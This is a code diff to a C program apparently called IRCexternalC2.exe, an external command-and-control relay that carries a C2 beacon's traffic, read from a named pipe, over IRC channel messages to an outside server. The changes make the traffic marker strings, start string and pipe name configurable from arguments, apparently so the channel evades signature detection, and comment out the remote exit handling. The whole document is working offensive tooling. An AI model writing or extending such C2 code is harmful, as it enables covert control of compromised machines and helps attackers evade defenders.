@@ -38,6 +38,19 @@ struct IRCinfo
 	char REALNAME[50];
 	char CHANNEL[50];
 	char TGTNICK[50];
+	char TRAFFIC_STR[50];
+	char LEN_STR[50];
+	char START_STR[50];
+	char PIPE_STR[50];
+	char privmsg[8];
+	char ping[5];
+	char pong[5];
+	char nick_str[5];
+	char pass[5];
+	char user_str[5];
+	char userhost[9];
+	char join[5];
+	char oper[5];
 };
 
 
@@ -200,14 +213,14 @@ int sendData(SOCKET sd, struct IRCinfo ircinfo, const char* data, DWORD len) {
 		{
 			memset(partial, 0, 425);
 			memcpy(partial, bufferfixed + offset, b64len-offset);
-			sendargv(sd, "PRIVMSG #%s :TrafficGen-%s\r\n", ircinfo.CHANNEL, partial);
+			sendargv(sd, "%s #%s :%s-%s\r\n", ircinfo.privmsg, ircinfo.CHANNEL, ircinfo.TRAFFIC_STR, partial);
 			break;
 		}
 		else
 		{
 			memset(partial, 0, 426);
 			memcpy(partial, bufferfixed + offset, 425);
-			sendargv(sd, "PRIVMSG #%s :TrafficGen-%s\r\n", ircinfo.CHANNEL, partial);
+			sendargv(sd, "%s #%s :%s-%s\r\n", ircinfo.privmsg, ircinfo.CHANNEL, ircinfo.TRAFFIC_STR, partial);
 			offset += 425;
 			Sleep(200);
 		}
@@ -235,12 +248,12 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 	char recvbuff[MAX+1];
 	char* msgbuff = NULL;
 	BOOL msgcompleteflag = FALSE;
-	char privDmExitMsg[64];
-	sprintf(privDmExitMsg, "PRIVMSG %s :exit", ircinfo.NICK);
-	char privChanExitMsg[64];
-	sprintf(privChanExitMsg, "PRIVMSG #%s :exit", ircinfo.CHANNEL);
+	//char privDmExitMsg[64];
+	//sprintf(privDmExitMsg, "PRIVMSG %s :exit", ircinfo.NICK);
+	//char privChanExitMsg[64];
+	//sprintf(privChanExitMsg, "PRIVMSG #%s :exit", ircinfo.CHANNEL);
 	char privChanPING[64];
-	sprintf(privChanPING, "PRIVMSG #%s :PING", ircinfo.CHANNEL);
+	sprintf(privChanPING, "%s #%s :%s", ircinfo.privmsg, ircinfo.CHANNEL, ircinfo.ping);
 	int msgbuff_len = 0;
 	char* leftover = NULL;
 	char* buff = NULL;
@@ -266,12 +279,13 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 		{
 			buff[strlen(buff) - 1] = '\0';
 		}
-		char* lenptr = strstr(buff, "Len-");
+		char* lenptr = strstr(buff, ircinfo.LEN_STR);
 		if (lenptr)
 		{
 			char* msg_end = "\0";
-			// Len- is 4 char
-			lenptr += 4;
+			// Length of LEN_STR +1 for '-'
+			int len_str_len = strlen(ircinfo.LEN_STR);
+			lenptr += (len_str_len + 1);
 			// Find end of message
 			msg_end = strstr(lenptr, "\r");
 			if (msg_end == NULL)
@@ -301,7 +315,7 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 				return -1;
 			memset(msgbuff, 0, msgbuff_len);
 		}
-		char* trafficptr = strstr(buff, "TrafficGen-");
+		char* trafficptr = strstr(buff, ircinfo.TRAFFIC_STR);
 		if (trafficptr && (msgbuff != NULL))
 		{
 			char* msg_end = "\0";
@@ -309,8 +323,9 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 			while (trafficptr != 0 && strlen(trafficptr) > 2)
 			{
 				printf("Encoded message recv\n");
-				// TrafficGen- is 11 char
-				trafficptr += 11;
+				// Length of TRAFFIC_STR +1 for '-'
+				int traffic_str_len = strlen(ircinfo.TRAFFIC_STR);
+				trafficptr += (traffic_str_len + 1);
 				// Find end of message (\r\n but the final \n of the packet has been changed to \0)
 				msg_end = strstr(trafficptr, "\r");
 				// printf("msg_end: %s\n", msg_end);
@@ -353,10 +368,10 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 					{
 						printf("Multi message packet\n");
 					}
-					trafficptr = strstr(msg_end, "TrafficGen-");
+					trafficptr = strstr(msg_end, ircinfo.TRAFFIC_STR);
 					if (!trafficptr)
 					{
-						// Didn't find TrafficGen string
+						// Didn't find TRAFFIC_STR string
 						if (strstr(msg_end - 3, "=="))
 						{
 							// Found == though
@@ -370,12 +385,15 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 		// int result = pingcheck(sd, recvbuff, buffer)
 		// if (result == 1)
 		// {return 1;}
-		if (strstr(recvbuff, "PING :"))
+		char pingstr[7];
+		strcpy(pingstr, ircinfo.ping);
+		strcat(pingstr, " :");
+		if (strstr(recvbuff, pingstr))
 		{
 			printf("PING! sending PONG.\n");
-			char* pingsvr = strstr(recvbuff, "PING :");
-			pingsvr += strlen("PING :");
-			sendargv(sd, "PONG :%s\n", pingsvr);
+			char* pingsvr = strstr(recvbuff, pingstr);
+			pingsvr += strlen(pingstr);
+			sendargv(sd, "%s :%s\n", ircinfo.pong, pingsvr);
 		}
 		else if (strstr(recvbuff, privChanPING))
 		{
@@ -387,11 +405,11 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 		// if (result == -1)
 		// {break;}
 		// Check if exit message in DM or channel
-		if (strstr(recvbuff, privDmExitMsg) || strstr(recvbuff, privChanExitMsg))
-		{
-			sendargv(sd, "PRIVMSG #%s :quitting\r\n", ircinfo.CHANNEL);
-			sendargv(sd, "QUIT :\r\n");
-		}
+		//if (strstr(recvbuff, privDmExitMsg) || strstr(recvbuff, privChanExitMsg))
+		//{
+		//	sendargv(sd, "PRIVMSG #%s :quitting\r\n", ircinfo.CHANNEL);
+		//	sendargv(sd, "QUIT :\r\n");
+		//}
 		// Check if ERROR message
 		if (strstr(recvbuff, "ERROR"))
 		{
@@ -417,6 +435,11 @@ DWORD recvData(SOCKET sd, struct IRCinfo ircinfo, char * buffer, DWORD max) {
 	memcpy((char *)&size, decodedmsg, 4);
 	printf("Msg len: %d\n", size);
 	// printf("unb64len: %d\n", unb64len);
+	if (size < 0)
+	{
+		printf("Error: size < 0\n");
+		return -1;
+	}
 	memcpy(buffer, decodedmsg + 4, size);
 	free(msgbuff);
 	return size;
@@ -483,9 +506,9 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
  */
 void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
 {
-	sendargv(sockfd, "PASS %s\r\n", ircinfo.OP_PASS);
-	sendargv(sockfd, "NICK %s\r\n", ircinfo.NICK);
-	sendargv(sockfd, "USER %s %s %s :%s\r\n", ircinfo.USER, "0", "*", ircinfo.REALNAME);
+	sendargv(sockfd, "%s %s\r\n", ircinfo.pass, ircinfo.OP_PASS);
+	sendargv(sockfd, "%s %s\r\n", ircinfo.nick_str, ircinfo.NICK);
+	sendargv(sockfd, "%s %s %s %s :%s\r\n", ircinfo.user_str, ircinfo.USER, "0", "*", ircinfo.REALNAME);
 
 	char recvbuff[MAX];
 	while(1)
@@ -503,16 +526,19 @@ void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
 			printf("Connection done?\n");
 			break;
 		}
-		if (strstr(recvbuff, "PING :"))
+		char pingstr[7];
+		strcpy(pingstr, ircinfo.ping);
+		strcat(pingstr, " :");
+		if (strstr(recvbuff, pingstr))
 		{
 			printf("PING! sending PONG.\n");
-			char* pingsvr = strstr(recvbuff, "PING :");
-			pingsvr += strlen("PING :");
-			sendargv(sockfd, "PONG :%s\n", pingsvr);
+			char* pingsvr = strstr(recvbuff, pingstr);
+			pingsvr += strlen(pingstr);
+			sendargv(sockfd, "%s :%s\n", ircinfo.pong, pingsvr);
 		}
 	}
 
-	sendargv(sockfd, "USERHOST %s\r\n", ircinfo.USER);
+	sendargv(sockfd, "%s %s\r\n", ircinfo.userhost, ircinfo.USER);
 	memset(recvbuff, 0, sizeof(recvbuff));
 	recv(sockfd, recvbuff, sizeof(recvbuff), 0);
 	printf("From Server : %s", recvbuff);
@@ -526,7 +552,7 @@ void ircconnect(SOCKET sockfd, struct IRCinfo ircinfo)
  */
 void ircjoin(SOCKET sockfd, struct IRCinfo ircinfo)
 {
-	sendargv(sockfd, "JOIN #%s\r\n", ircinfo.CHANNEL);
+	sendargv(sockfd, "%s #%s\r\n", ircinfo.join, ircinfo.CHANNEL);
 }
 
 
@@ -540,7 +566,7 @@ void ircjoin(SOCKET sockfd, struct IRCinfo ircinfo)
  */
 void becomeoper(SOCKET sockfd, struct IRCinfo ircinfo)
 {
-	sendargv(sockfd, "OPER %s %s\r\n", ircinfo.OP_NICK, ircinfo.OP_PASS);
+	sendargv(sockfd, "%s %s %s\r\n", ircinfo.oper, ircinfo.OP_NICK, ircinfo.OP_PASS);
 }
 
 
@@ -552,8 +578,7 @@ void becomeoper(SOCKET sockfd, struct IRCinfo ircinfo)
  */
 void cloakstart(SOCKET sockfd, struct IRCinfo ircinfo)
 {
-	// TODO: Either find a better way to do this or change the string
-	sendargv(sockfd, "PRIVMSG #%s :cloak\r\n", ircinfo.CHANNEL);
+	sendargv(sockfd, "%s #%s :%s\r\n", ircinfo.privmsg, ircinfo.CHANNEL, ircinfo.START_STR);
 }
 
 
@@ -564,10 +589,10 @@ void cloakstart(SOCKET sockfd, struct IRCinfo ircinfo)
 void main(int argc, char* argv[])
 {
 	// Set connection and IRC info
-	if (argc != 11)
+	if (argc != 15)
 	{
 		printf("Incorrect number of args: %d\n", argc);
-		printf("Incorrect number of args: IRCexternalC2.exe [IP] [PORT] [NICK] [OP_NICK] [OP_PASS] [USER] [REALNAME] [CHANNEL] [TGTNICK] [SLEEP(ms)]");
+		printf("Incorrect number of args: IRCexternalC2.exe [IP] [PORT] [NICK] [OP_NICK] [OP_PASS] [USER] [REALNAME] [CHANNEL] [TGTNICK] [SLEEP(ms)] [TRAFFIC_STR] [LEN_STR] [START_STR] [PIPE_STR]");
 		printf("Values should be no more than 49 bytes.\n");
 		exit(1);
 	}
@@ -582,6 +607,19 @@ void main(int argc, char* argv[])
 	strcpy(ircinfo.CHANNEL, argv[8]);
 	strcpy(ircinfo.TGTNICK, argv[9]);
 	long sleep_timer = strtol(argv[10],NULL, 10);
+	strcpy(ircinfo.TRAFFIC_STR, argv[11]);
+	strcpy(ircinfo.LEN_STR, argv[12]);
+	strcpy(ircinfo.START_STR, argv[13]);
+	strcpy(ircinfo.PIPE_STR, argv[14]);
+	strcpy(ircinfo.privmsg, "PRIVMSG");
+	strcpy(ircinfo.ping, "PING");
+	strcpy(ircinfo.pong, "PONG");
+	strcpy(ircinfo.nick_str, "NICK");
+	strcpy(ircinfo.pass, "PASS");
+	strcpy(ircinfo.user_str, "USER");
+	strcpy(ircinfo.userhost, "USERHOST");
+	strcpy(ircinfo.join, "JOIN");
+	strcpy(ircinfo.oper, "OPER");
 
 	DWORD payloadLen = 0;
 	char* payloadData = NULL;
@@ -623,7 +661,12 @@ void main(int argc, char* argv[])
 	while (beaconPipe == INVALID_HANDLE_VALUE) {
 		// Create our IPC pipe for talking to the C2 beacon
 		Sleep(500);
-		beaconPipe = connectBeaconPipe("\\\\.\\pipe\\mIRC");
+		// 50 (max size of PIPE_STR) + 13 (size of "\\\\.\\pipe\\")
+		char pipestr[50+13]= "\\\\.\\pipe\\";
+		// Pipe str (i.e. "mIRC")
+		strcat(pipestr, ircinfo.PIPE_STR);
+		// Full string (i.e. "\\\\.\\pipe\\mIRC")
+		beaconPipe = connectBeaconPipe(pipestr);
 	}
 	printf("Connected to pipe!!\n");
 
